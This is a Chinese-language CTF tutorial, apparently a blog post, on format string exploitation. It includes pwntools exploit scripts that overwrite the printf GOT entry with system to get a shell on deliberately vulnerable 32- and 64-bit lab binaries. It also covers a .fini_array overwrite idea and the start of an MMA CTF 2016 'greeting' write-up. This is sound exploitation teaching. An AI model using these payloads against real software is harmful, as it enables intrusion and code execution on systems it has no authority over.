<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt"</span>)</span><br><span class="line">offset=7</span><br><span class="line">printf_got=elf.got['printf']<span class="comment">#0x0804a010</span></span><br><span class="line">system_plt=elf.plt['system']<span class="comment">#0x08048360</span></span><br><span class="line">print <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line">print <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#思路：向 printf_got 中 写入 system_plt</span></span><br><span class="line"><span class="comment"># 我们把  printf_got 最低位字节 覆盖成 0x60  一字节 写入 %hhn</span></span><br><span class="line"><span class="comment"># 我们把  printf_got 最低位字节+1字节 覆盖成 0x83  一字节 写入 %hhn</span></span><br><span class="line"><span class="comment"># 我们把  printf_got 最低位字节+2字节 覆盖成 0x04  一字节 写入 %hhn</span></span><br><span class="line"><span class="comment"># 我们把  printf_got 最低位字节+3字节 覆盖成 0x08  一字节 写入 %hhn</span></span><br><span class="line"></span><br><span class="line">payload=p32(printf_got)      <span class="comment">#0x60          # 偏移  为 7</span></span><br><span class="line">payload+=p32(printf_got+1)   <span class="comment">#0x83          # 偏移  为 8</span></span><br><span class="line">payload+=p32(printf_got+2)   <span class="comment">#0x04          # 偏移  为 9</span></span><br><span class="line">payload+=p32(printf_got+3)   <span class="comment">#0x08          # 偏移  为 10</span></span><br><span class="line"></span><br><span class="line">payload+=<span class="string">"%"</span>+str(0x60-0x4*4)+<span class="string">"c%7$hhn"</span>        <span class="comment">#0x60          # 偏移  为 7</span></span><br><span class="line">payload+=<span class="string">"%"</span>+str(0x83-0x60)+<span class="string">"c%8$hhn"</span>         <span class="comment">#0x83          # 偏移  为 8</span></span><br><span class="line">payload+=<span class="string">"%"</span>+str(0x104-0x83)+<span class="string">"c%9$hhn"</span>        <span class="comment">#0x04          # 偏移  为 9  #由于是hhn所以会被截断，只留后两位</span></span><br><span class="line">payload+=<span class="string">"%"</span>+str(0x8-0x4)+<span class="string">"c%10$hhn"</span>          <span class="comment">#0x08          # 偏移  为 10</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功getshell！<br>其实 有一点疑问的 明明  printf_got，system_plt 的地址 的搞两个字节 相同，但在这题中 如果不覆盖 会失败！</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zpkuD.png" alt="8zpkuD.png"></p>
<h1 id="pwntools之-Fmtstr"><a href="#pwntools之-Fmtstr" class="headerlink" title="pwntools之 Fmtstr"></a>pwntools之 Fmtstr</h1><p>在 pwntools 提供给了 我们一个 很方便的 类 Fmtstr，用于构造 格式化任意写 的payload<br>官方文档可见于：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>docs.pwntools.com<span class="regexp">/en/</span>stable<span class="regexp">/fmtstr.html</span></span><br></pre></td></tr></table></figure>

<p>最常用 功能：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">fmtstr_payload</span>(<span class="selector-tag">offset</span>, &#123;<span class="attribute">printf_got</span>:system_plt&#125;)</span><br></pre></td></tr></table></figure>

<p>即<br>第一个参数 为 输入的payload 的偏移，第二个参数 为一个 {} 组合，“:”前面是要覆盖地址里的内容 被覆盖为”:”后面的内容。<br>所以这题就可以这样构造：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">p</span>=process("./fmt")</span><br><span class="line"><span class="attribute">elf</span>=ELF("./fmt")</span><br><span class="line"><span class="attribute">offset</span>=7</span><br><span class="line"><span class="attribute">printf_got</span>=elf.got[<span class="string">'printf'</span>]#0x0804a010</span><br><span class="line"><span class="attribute">system_plt</span>=elf.plt[<span class="string">'system'</span>]#0x08048360</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got:system_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>而上面 是 32 位程序，我们现在来学下 看下更加主流的 64 位程序  是如何的。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -fno-stack-protector -no-pie -o fmt fmt.c    为了调试方便，关闭canary 和pie 保护；  另外去掉 -m32 参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(&amp;buf,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我门首先还是  查看 偏移：</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaa<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span></span><br></pre></td></tr></table></figure>

<p>gdb 调试：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zpEHH.png" alt="8zpEHH.png"></p>
<p>发现，我们的payload 存放在  栈顶了，偏移难道是 0 吗，当然并不是。</p>
<p>但我们都知道 64 位程序 传参的时候是 从左到右 依次放入 寄存器：rdi，rsi，rdx，rcx，r8，r9 ，<br>当参数大于等于 7 的时候 后面参数会依次 从右向左 放入栈中！</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zpZEd.png" alt="8zpZEd.png"></p>
<p>即 栈顶 存放的我们输入的payload 是作为了 printf 函数的 第7个参数，格式化字符串的第6个参数。偏移即为 6.<br>我们可以简单证明下：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zpeUA.png" alt="8zpeUA.png"></p>
<p>我们知道了偏移，也可以得到  printf_got,printf_plt  那么看看是否 64位 也可以 用Fmtstr 一把梭 getshell!<br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./fmt_64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt_64"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">printf_got=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf_got is 0x601020</span></span><br><span class="line"><span class="string">system_plt is 0x40049c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got:system_plt&#125;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>发现 并不能 这样 构造  我们可以看下 payload(以dubug 查看)<br><img src="https://s1.ax1x.com/2020/03/26/8zpm4I.png" alt="8zpm4I.png"></p>
<p>在 \x20\x10\x60后面的 是64位程序地址的高位 “\x00”但 “\x00”又会 是 字符串的结束符，相当于 截断了 payload。<br>使payload 失去作用。<br>于是 我们可以 调整payload，将 地址 放在 payload 的最后。由于地址中带有\x00，所以这回就不能用%hhn分段写了，因此我们的payload构造如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./fmt_64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt_64"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">printf_got=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf_got is 0x601020</span></span><br><span class="line"><span class="string">system_plt is 0x40049c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%"</span>+str(system_plt)+<span class="string">"c%6$lln"</span>+p64(printf_got)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>gdb 查看下 是否对齐 和printf_got所在偏移</p>
<p><img src="https://s1.ax1x.com/2020/03/26/8zpuCt.png" alt="8zpuCt.png"></p>
<p>可以发现错位了 1字节 偏移为8<br>我们修正 下 payload，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./fmt_64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt_64"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">printf_got=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf_got is 0x601020</span></span><br><span class="line"><span class="string">system_plt is 0x40049c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">"a"</span>+<span class="string">"%"</span>+str(system_plt<span class="number">-1</span>)+<span class="string">"c%8$lln"</span>+p64(printf_got)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/03/26/8zpK8P.png" alt="8zpK8P.png"></p>
<p>getsehll  成功！！！</p>
<p>当我们程序只能运行 一次呢，我们要怎样 gadshell 呢。<br>再无法 ROP的情况下，我们如何利用 格式化字符串 来使得程序重新 运行呢。<br>这里有个 流程表，    </p>
<p>main函数作为程序入口，但编译成程序的时候入口其实是start代码段。（看下面图更利于理解）start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。</p>
<p>在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。<br>（以上两行内容  来自 <a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43624-1-1.html</a> ）<br><img src="https://s1.ax1x.com/2020/03/26/8zpMgf.png" alt="8zpMgf.png"></p>
<p>所以 如果 程序 不存在循环，我们的思路一般是，把 printf_got 给改成 system_plt, 同时 把我们可以  将.fini._arrary 中的 第一个指针 给 覆盖成 start 地址，当 程序 结束后，调用  .fini._arrary的第一个指针，便将执行流 弄到 程序在开始处，即相当于重新 执行了一次程序，但  printf_got 已经 是 system_plt 了，我们 输入 “/bin/sh\x00”就可拿到 shell。</p>
<p>我看到 这里时，本试图自己写个小程序</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -fno-stack-protector -no-pie -o fmt_64_2 fmt.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常 来想 我觉得  这样 是可以  getshell 的。</p>
<p>但因为 无法控制    .fini._arrary 所造内存的 RWX状态，没法 向  .fini._arrary 第一个指针里 写入  内容。  默认只可读。<br><img src="https://s1.ax1x.com/2020/03/26/8zpQv8.png" alt="8zpQv8.png"></p>
<p>但假设 它可写，没意外的话，以下 exp 是应该是 可以 getshell 的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./fmt_64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt_64"</span>)</span><br><span class="line"><span class="comment">#offset=6</span></span><br><span class="line">printf_got=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x4005c7</span></span><br><span class="line">fini_array=<span class="number">0x600e18</span>        <span class="comment">#readelf -S fmt_64 | grep fini_array</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">backdoor is 0x4005c7</span></span><br><span class="line"><span class="string">fini_array is 0x600e18</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"backdoor is "</span>+hex(backdoor)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"fini_array is "</span>+hex(fini_array)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>+<span class="string">"%"</span>+str(backdoor<span class="number">-1</span>)+<span class="string">"c%8$lln"</span>+p64(fini_array)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b main")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>不假设了，还是看真题吧！</p>
<h1 id="MMA-CTF-2nd-2016-greeting"><a href="#MMA-CTF-2nd-2016-greeting" class="headerlink" title="MMA CTF 2nd 2016-greeting"></a>MMA CTF 2nd 2016-greeting</h1><p>即 32位 的elf  文件，开启了 canary </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$file</span> <span class="string">greeting</span></span><br><span class="line"> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.24</span><span class="string">,</span> <span class="string">BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"></span><br><span class="line"><span class="string">$checksec</span> <span class="string">greeting</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure>

<p>拖入 ida:<br>看下程序 流程：<br>程序大概就是我们输入等于64 个字符 到v5中，然后 将”Nice to meet you, “+我们输入的64个字符+ “:)\n” 复制到s中！</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please tell me your name... "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !getnline(&amp;v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Don't ignore me ;( "</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"Nice to meet you, %s :)\n"</span>, &amp;v5);    <span class="comment">//格式化字符串漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="comment">//这里存在 很明显的  格式化字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> __<span class="function">cdecl <span class="title">getnline</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解题思路：</p>
<ol>
<li>为了程序重新运行，我们将.fini_array数组的第一个元素为start地址</li>
<li>因为当执行过start地址后，.fini_array数组的第一个元素将不再是start地址，所以我们在将程序重新执行后，我们需要将执行过程中的一个函数的got地址改成system的plt地址，然后第二次就直接输入/bin/sh\x00 拿shell了</li>
</ol>
<p>测偏移：12<br>首先 输入 aaaa%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I'm nao!</span><br><span class="line">Please tell me your name... aaaa<span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span></span><br><span class="line">Nice <span class="keyword">to</span> meet you, aaaa<span class="number">0x80487d0</span>..<span class="number">0xffa5f54c</span>..(nil)..(nil)..(nil)..(nil)..<span class="number">0x6563694e</span>..<span class="number">0x206f7420</span>..<span class="number">0x7465656d</span>..<span class="number">0x756f7920</span>..<span class="number">0x6161202c</span>..<span class="number">0x70256161</span>..<span class="number">0x70252e2e</span>..<span class="number">0x70252e2e</span>..<span class="number">0x70252e2e</span>. :)</span><br></pre></td></tr></table></figure>

